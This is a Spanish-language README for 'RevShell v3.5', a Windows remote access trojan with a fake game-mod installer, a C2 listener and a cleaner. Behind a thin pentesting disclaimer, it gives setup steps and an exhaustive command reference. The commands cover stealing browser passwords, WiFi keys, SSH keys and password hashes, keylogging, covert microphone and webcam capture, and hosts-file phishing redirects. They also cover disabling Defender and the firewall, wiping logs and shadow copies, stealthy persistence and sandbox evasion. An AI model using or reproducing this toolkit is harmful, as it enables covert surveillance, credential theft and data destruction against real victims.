# 🔒 RevShell v3.5 — Guía Completa (en curso)

---
> **📢DISCLAIMER📢:** I apologize, but this README.md file is currently in Spanish and incomplete. I will update it in the coming days, and I will also upload the corresponding TECHNICAL.md file for this version.
---

> **Uso educativo y pentesting autorizado.**  
> El uso de estas herramientas sin consentimiento explícito es **ilegal**.

---

## 📁 Estructura del Proyecto

| Archivo | Descripción |
|---|---|
| `victim_win.pyw` | Implante para Windows (usuario estándar) |
| `victim_win_ADMIN.pyw` | Implante para Windows (con escalada a admin + UAC bypass) |
| `listener.py` | Servidor C2 (listener) — donde controlas la sesión |
| `cleaner.py` | EDR / Scanner de IoCs — detecta y limpia infecciones de tus pruebas |

### 💡 ¿Cómo Funciona? (Explicación para Principiantes)
Imagina que el **Listener** (`listener.py`) es tu "centro de mando" o "torre de control". Lo ejecutas en tu máquina atacante y se queda escuchando.
El **Implante o Víctima** (`victim_win.pyw`) es el programa espía. Cuando la víctima lo ejecuta (por ejemplo, creyendo que es un instalador de mods de un juego gracias a su Interfaz Gráfica falsa), este espía silencia los errores, se instala en el sistema aplicando persistencia (asegurándose de que arranque cada vez que se enciende el PC) y se conecta "hacia afuera" a tu torre de control.
Una vez conectados, tienes acceso absoluto a una terminal interactiva (C2) con comandos mágicos preprogramados, todo de forma encriptada e invisible para el usuario.

---

## ⚙️ Configuración Inicial

### 1. Editar parámetros de conexión

En **ambos** `victim_win.pyw` y `victim_win_ADMIN.pyw`, edita la parte superior:

```python
ATTACKER_IP = "192.168.1.100"    # Tu IP (El equipo atacante)
ATTACKER_PORT = 4444             # Puerto por el que escucha tu listener
SHARED_SECRET = b"R3vSh3ll_v3_S3cr3t_K3y!" # Clave de cifrado simétrico RC4
BEACON_JITTER = True             # Activa espera aleatoria para conectarse (Evade IAs de red)
BEACON_MIN = 3                   # Tiempo mínimo aleatorio
BEACON_MAX = 10                  # Tiempo máximo aleatorio
```

En `listener.py`, asegura que el puerto y la contraseña sean exactamente los mismos:
```python
LISTEN_PORT = 4444
SHARED_SECRET = b"R3vSh3ll_v3_S3cr3t_K3y!"
```

### 2. Dependencias

- **Listener**: Python 3.8+ (No requiere pip).
- **Víctima**: Python 3.8+ (No requiere pip, usa librerías nativas de Windows y Tkinter).
- **Cleaner**: Python 3.8+ (No requiere pip).

---

## 🚀 Despliegue Rápido

1. **Atacante:** Abre la consola y ejecuta `python listener.py`.
2. **Víctima:** Envíale o haz doble clic en `victim_win.pyw` (usuario normal) o en `victim_win_ADMIN.pyw` (pedirá permisos de administrador de forma camuflada).
3. **Control:** Aparecerá la sesión en tu terminal. Escribe comandos desde abajo.

---

## 📋 REFERENCIA DEFINITIVA DE TODOS LOS COMANDOS

A continuación, la lista exhaustiva de todos y cada uno de los comandos programados en el implante, ordenados por categorías tal cual se muestran en menú `help`.

### 📂 Navegación y Archivos
*Todo lo relacionado con moverte por las carpetas y manipular el disco de la víctima.*

| Comando | Sintaxis / Opciones | Descripción de lo que hace |
|---|---|---|
| Moverse | `cd <directorio>`, `pwd`, `ls [dir]` | Cambia de directorio, te dice dónde estás y lista los archivos respectivamente. |
| Árbol | `tree [dir] [profundidad]` | Dibuja en ASCII un árbol de subcarpetas espectacular, ideal para ver la estructura. |
| Bajar Archivo | `download <archivo>` | Descarga un archivo concreto de la víctima a tu ordenador de atacante. |
| Bajar Carpeta | `download_dir <directorio>` | Comprime una carpeta entera de la víctima en formato ZIP y te roba el ZIP. |
| Subir Archivo | `upload <archivo_local>` | Sube un archivo útil (un exploit o doc) tuyo a la carpeta actual de la víctima. |
| Leer Texto | `cat <file>`, `head <f> [n]`, `tail <f> [n]` | `cat` escupe todo el texto de un txt. `head` las primeras N líneas, `tail` las últimas. |
| Buscar | `search <patrón>` | Escanea el disco C: entero en busca de un archivo (ej: `search *.kdbx` para contraseñas). |
| Inspeccionar | `grep <texto> [ruta]` | Busca palabras clave concretas *por dentro* del contenido de los archivos de texto. |
| Detalles | `file_info <ruta>` | Analiza un archivo, devuelve su peso, creador, fechas exactas y expone sus hashes MD5/SHA256. |
| Crear / Borrar | `touch <f>`, `mkdir <d>`, `rmdir <r>` | Crear archivo vacío, inventar una carpeta o destruir/eliminar carpetas y archivos. |
| Modificar | `mv <src> <dst>`, `cp <src> <dst>` | Mover (sirve para renombrar) y Copiar archivos de una ruta a otra. |
| Escribir | `write <f> <cont>`, `append <f> <cont>` | `write` sobreescribe todo un archivo con el texto nuevo. `append` le mete una nueva línea al final. |
| Falsificar fecha | `chattr <file> [timestamp]` | Cambia astutamente la fecha de última modificación/creación de un archivo para engañar peritos forenses. |

### 🧲 Recolección (Devuelven archivos a tu PC)
*Estos comandos recopilan paquetes masivos de inteligencia y te los descargan automáticamente.*

| Comando | Formato | Descripción |
|---|---|---|
| `steal` | ZIP | Empaqueta automáticamente `Desktop`, `Downloads`, `Documents`, `Pictures` y `Videos` del usuario y te los manda. |
| `sysinfo` | TAR | Fabrica un paquete avanzado con tablas de enrutamiento, DNS, firewall, procesos; toda la telemetría general. |
| `screenshot` | PNG | Saca una foto instantánea en alta calidad de la pantalla de la víctima y se te guarda en local. |
| `browsers` | ZIP | Coge los perfiles de Chrome, Brave, Firefox, Edge, y extrae tus Historiales, Cookies y Passwords guardadas. |
| `exfil` | TAR | **Botón Nuke:** Combina todo lo de arriba (sysinfo, wifi, browsers, screenshot y porta-papeles) en un super-archivo. |
| `record_screen <segs>`| ZIP | Se queda grabando la pantalla el número de segundos que pidamos y te envía un ZIP con las fotos de todo el evento. |
| `record_mic <segs>`| WAV | Enciende los micros y los graba esos N segundos enviándote el mp3/WAV a local en estricto secreto. |
| `webcam_snap` | JPG | Intenta tomarse una foto con la cámara delantera conectada. Solo devuelve JPG si logra luz verde. |
| `scrloop` | `start [s]`, `stop`, `dump`, `clear` | Ejecuta en fondo un proceso PowerShell que saca 1 captura silenciosa cada [s] segundos en disco. Se roba con `dump`. |

### 🔑 Credenciales y Secretos
*Sección para apoderarse de identidades.*

| Comando | Descripción |
|---|---|
| `wifi` | Extrae del sistema operativo local una tabla clara con los nombres de RED WiFi usadas y sus contraseñas en plano. |
| `credvault` | Accede a Windows Credential Vault (las credenciales web de IE o accesos guardados de cuentas de MS). |
| `find_secrets` | Rastrea archivos sensibles como `.env`, `.cert`, claves `SSH`, `KeePass`, `AWS credentials` sin que tú tengas que buscar. |
| `ssh_keys` | Escupe el contenido de cualquier clave criptográfica RSA/Ed25519 de la carpeta .ssh del usuario. |
| `token_steal` | Analiza el SID actual, cuentas logeadas y tickets de Windows para usurpar sesiones delegadas. |

### 📡 Información y Reconocimiento
*Comandos pasivos para conocer con qué te estás enfrentando.*

| Comando | Descripción de lo que devuelve |
|---|---|
| `status` / `quick_info` | Resume rápido si es Admin, IP local, nombre del equipo, Uptime y versión del OS. |
| `geolocate` | Haz ping hacia internet a una API para triangular el continente, país y ciudad aproximada de su router ISP. |
| `proc_list` / `software` | Ver tabla completa de todos los `.exe` corriendo, y una lista de todo el Software legítimamente Instalado en su panel de control. |
| `net_scan [subnet]` | Envía pings internos (sweep) hacia toda la red 192.168.x.x para ver cuántas máquinas cercanas o vecinos le acompañan. |
| `port_scan <ip> [pts]` | Realiza un paneo a esa IPv4 para adivinar qué puertos (servicios) tiene abiertos para futuros ataques. |
| `dns_lookup <dom>` / `traceroute` | Averigua correos asociados (MX) o haz un traceroute con saltos ICMP para ver la topología por la que pasas al llegar a un host. |
| `arp_table` / `netstat` / `active_conn` | Verifica a quién está hablado su máquina TCP/UDP en vivo, puertos de escucha local, y la tabla ARP para clonar MACs. |
| `list_wifi` | Lista todas las señales WiFi físicas colindantes que la antena de la víctima llega a oler o ver. |
| `privesc` | Script interno que repasa debilidades típicas para escalar permisos (Ej. rutas feas). Si ve flaquezas, te avisa de vías de explotación. |
| `getenv [var]` | Lee las Variables del Sistema enteras, a veces esconde contraseñas de BBDD temporales. |
| `uptime` / `disk_info` / `screen_res` | Días sin apagar, porcentaje total y libre de los Discos Duros conectados (USBs), y resolución de pantalla nativa. |
| `timezone` / `idle_time` | Zona de reloj y Cuántos segundos lleva la persona sin tocar el ratón (vital para atacar sin que te vea). |
| `recent_files` / `drivers` | Documentos abiertos estas últimas semanas, y tarjetas/drivers instalados. |
| `startup_list` / `shares` | Todo lo que arranca al poner su contraseña, y carpetas de red compartidas al mundo (`smb`). |
| `whoami` / `hostname` | El nombre que Windows sabe de ese ordenador. |
| `net_user [u]` / `net_group` | Conoce las cuentas locales, comprueba si un pibe llamado "Admin-Local" existe para fastidiarlo o si hay administradores extraños. |
| `reg_query <ruta>` | Interroga puramente los registros regedit en Windows. |

### 🛠️ Control de Apps
| Comando | Descripción |
|---|---|
| `kill_app <nombre>` | Aplasta procesos (ej: `kill_app chrome.exe` forzará cerrar el navegador abruptamente). |
| `open_app <nombre>` | Arranca un programa en la máquina de forma desatendida. |
| `hide_app <nombre>` / `show_app` | Oculta la parte gráfica de un programa o lo vuelve visible como si fuera magia. |

### 🤡 Disrupción y Trolling (MEJORADO v3.5)
*Si la víctima está mirando el PC, sabrá que estás dentro. Usar de forma didáctica o caótica.*

| Comando | Descripción |
|---|---|
| `lock_screen` | Da la orden de pulsar Win-L bloqueando la pantalla pidiéndole el PIN o Login, ideal si saliste de robar. |
| `change_wallpaper <r>` / `wallpaper_url <u>` | Cárgale la imagen local `r` como Wallpaper de fondo. Si usas la versión `_url`, se la bajará del link que le pases directamente y le planeará la cara. |
| `alert <msg>` / `msgbox <título>\|<txt>` | Lanza pestañas Popaps nativos tipo Windows con los mensajes que quieras (el msgbox incluye Título customizado). |
| `play_sound` / `set_volume <0-100>` | Produce Beeps. Puedes subirle obligadamente en volumen general con set_volume para garantizar molestia o bajárselo a fondo. |
| `tts <texto>` | Hace que los Altavoces FÍSICOS hablen obligatoriamente en voz alta lo que tú decidas con voz robótica de Windows. |
| `type_text <texto>` | Escribe texto real usando su teclado (se teclea de fantasía en lo que sea que tenga ahí mismo como un chat o bloc). |
| `open_url <url>` | Levanta su internet y le despliega la web o video youtube en el primer plano que le señales. |
| `swap_mouse` / `restore_mouse` | Destroza la orientación de su ratón de forma física invirtiendo su clic derecho con el del izquierdo, ideal para volverlos muy locos. |
| `hide_taskbar` / `show_taskbar` | Le esfuma entera su barra de herramientas start de debajo quitándole los botones de encender computadora. |
| `crazy_cursor [seg]` | Arrebata su cursor y lo agita durante equis segundos a máxima velocidad incontrolable en todos los ejes del monitor. |
| `open_cd` / `close_cd` | Orden C API vieja para extraer sus bandejas estáticas de DVDs si tuviese una montada. |

### 📋 Portapapeles (Robo directo)
| Comando | Descripción |
|---|---|
| `clipboard` / `clip_set <txt>` / `wipe_` | Ve qué copiaron, fuérzales a pegar enlaces tuyos falsos o bórrales todo el portapapeles. |
| `clip_monitor <start\|stop\|dump\|clear>` | Arranca un Powershell que cada segundo espía todo el Copy-Paste que hagan silencioso para dumpearlo luego. |
| `hosts_edit <dom> <ip>` | Ataque local de DNS, si escriben `paypal.com`, los envía a tu IP o cualquier servidor de phising alterando su archivo HOSTS. |

### 🔀 Port Forwarding (NUEVO v3.5 - TCP Pivoting)
*Utiliza a la Pobre Víctima como Enrutador o Pasarela.*

| Comando | Descripción del modo de acción |
|---|---|
| `port_fwd <lport> <rhost> <rport>` | Levanta un puerto en tu atacante y fuerza que el tráfico atraviese a la víctima y de allí, salte a la maquina interna `<rhost>`. Útil si te cuelas conectarte a un CPanel web o Telnet que la víctima SÍ tiene alcance, pero tú no directo. |
| `port_fwd_stop [lport]` | Termina este enlace túnel antes de que sospechen por carga. |
| `port_fwd_list` | Te enumera cuántos sub-túneles tienes abarcando activos. |

### 🔌 Energía y Descargas Remotas
| Comando | Descripción |
|---|---|
| `battery` / `reboot` / `shutdown` / `logoff` | Extrae su %, forzar reinicio, darle hachazo físico y apagar computadora, o cerrar sesión. |
| `download_url <url> [dest]` | Bájale de internet lo que sea desde fuera a disco. |
| `exec_remote <url>` | Traete un malware u binario externo sin guardarlo y ponlo que se ejecute a través de ellos mismos en RAM. |

---

## 🔴 Comandos SOLO-ADMIN (victim_win_ADMIN.pyw)

*(Estos mandos requieren privilegios máximos UAC, lo cual está disimulado en una solicitud GUI falsa. Son armas exclusivas).*

| Mando Admin | ¿Qué hace? (Nivel Experto) |
|---|---|
| `disable_defender` | Deshabilita protección activa, bloquea escaneadores de la IA en Defender, inyecta su propio directorio en Exclusiones con Powershell silenciado y borra pistas IOAV. |
| `disable_firewall` / `disable_uac` | Echa todos los perfiles NAT/Red del Firewall (Domain/Private/Public). Baja la protección EnableLUA a nivel Cero permitiendo barra libre de escaladas. |
| `dump_hashes` / `dump_lsass` | Ejecuta el famoso robo de bases de memoria SAM/SYSTEM y de los dump locales Lsass para descargas con mimi-katz contraseñas cleartext de otras redes. |
| `clear_logs` | Llama al sistema EvtClear preborrando para tapar pistas todos los registros forenses Windows-Security donde tú estabas trasteando. |
| `exclude_path <r>` / `exclude_ext` | Protege los directorios que tú mandes forzando al Windows Defender a obviar tus nuevos malwares. |
| `enable_rdp` / `add_user <u> <p>` | Agrega un usuario físico con tu propia Contraseña secreta pero escondiendo su existencia visual del menú de selección Inicial login (SpecialAccounts\UserList) al activarle RDP. |
| `disable_taskmgr` / `disable_cmd` | Desactiva sus aplicaciones Regedit para inhabilitar Task Manager e impedir que tiren con matar procesos, o prohibe la consola. (`enable` los restaura). |
| `shadow_list` / `shadow_delete` | Destruye (como en el Ransomware real de tipo WannaCry) los Volúmenes "Shadow Copies" Vssadmin lo cual los aboca a no poder recuperar nada de copias de archivo. |
| `sys_persist` | Activa un Job task Scheduler SYSTEM super agresivo, asegurando que tú serás el Dueño del Server al recargar. |
| `persist_wmi` | **Persistencia Fileless Indetectable:** Arranca usando Windows Management Instrumentation de evento "CommandlineEventConsumer", un método ultra-persistente al boot sin modificar Startups ni Claves Registry comunes. Escapa de IAs fácilmente. |
| `safe_mode_persist` | Activa que sigas hackeado incluso si tratan de bootear el sistema en el hermético Safe Mode (Modo Seguro de Windows). |
| `blue_screen` | ¡Bomba nuclear! Provoca un fallo `NtRaiseHardError` mandándolo al colapso crítico BSOD. |

---

## 🐛 Persistencia & Keylog & Limpieza

| Comando | Descripción |
|---|---|
| `persist [all\|registry\|task\|startup]` / `persist toggle` | Implanta la persistencia si te habías caído o alterna modo pasivo de "jiggle beacon" por si quieres mantenerte reconectándo. |
| `keylog <start\|stop\|dump\|clear>` | Arranca el Powershell local interceptor de teclado (Keystrokes KeyLogger). Roba los outputs usando `dump` las letras precisan guardarse en fichero. |
| `autodestroy` | **Botón de Pánico.** Desmantela la persistencia del Editor Regedit, purga Powershell tasks, tumba el VBS de Startup, re-activa lo desactivado y se suicida desvaneciéndose la victíma del radar y borrando tus scripts. |
| `cleanup` | Retira migos temporales del PC que dejaste haciendo scrips (como `.wavs`, `.zips`, `tar`, `.png`). |
| `ps <comando>` / `<cmd_libre>` | Escribe PowerShell o MSDOS CMD en vivo puramente nativos como si estuvieras en tu propia CMD local. Si es puro linux Bash fallaran porque solo es DOS. |
| `exit` / `kill_shell` / `kill <exe>` | Sale del script tu conexión. (El script reconecta si no le mandas Kill duro total `kill_shell`). |

### Y EL MODO LOCAL
- Los comandos de tu lado local comienzan por `!`.  
- Ejem: `!ls`, `!ifconfig`, `!clear` ejecutan el panel terminal dentro de TU MÁQUINA, el Atacante de Kalilinux/Windows. No manda el paquete al cliente exterior.

---

## 🔐 Detalles Técnicos y Criptografía

### Cifrado (RC4 Completo en v3.5)
Todas las comunicaciones utilizan un cifrado de matriz RC4 Stream Cipher asociado con un `Nonce` pseudoaleatorio de sesión que se genera fresco (es diferente) en cada encendido. Esto impide los métodos pasivos de WireShark para leerte paquetes estáticos y te protege a ti (El Red Teamer) si usan IPS con firmas estables.

### Dropper GUI (Interfaz Interceptora Falsa) e Híbrido Anti-VM
- Al ejecutarse como intruso, el `victim.pyw` analizará de forma hostil la resolución de Pantalla. Si es una resolución inútilmente pequeña (< 800x600), sabe que es una máquina de Analista. Verifica que existan unos Mínimos Gigas de Ram (+2GB) y el BIOS Serial no provenga de Oracle VirtualBox, Innotek o VM-Ware. Evalúa Uptime de MS Ticks para rechazar CuckooSandboxing. Si un EDR Virtual detecta algo y te prueba, el malware literalmente fingirá NO EXistir... y morirá sin lanzar C2.
- Pero si parece un jugador de un Juego normal u Oficinista: Abre automáticamente una Interfaz Ficticia ultra sofisticada para convencerlo que es "ModLoader Pro Game Installer". Finge la bajada web, y al 100% mostrará "Error de permisos/Access Denied y crashea", pero mientras leía esa barra de carga... su sistema ya fue infiltrado en milisegundos con persistencias infinitas listos en tu terminal y ya serás Administrador permanente.

> _Nota: Toda operación delictiva sin contrato (Autorización Black-Box Escrita) constituye violación penal de regulaciones TI vigentes de Hacking Severo._
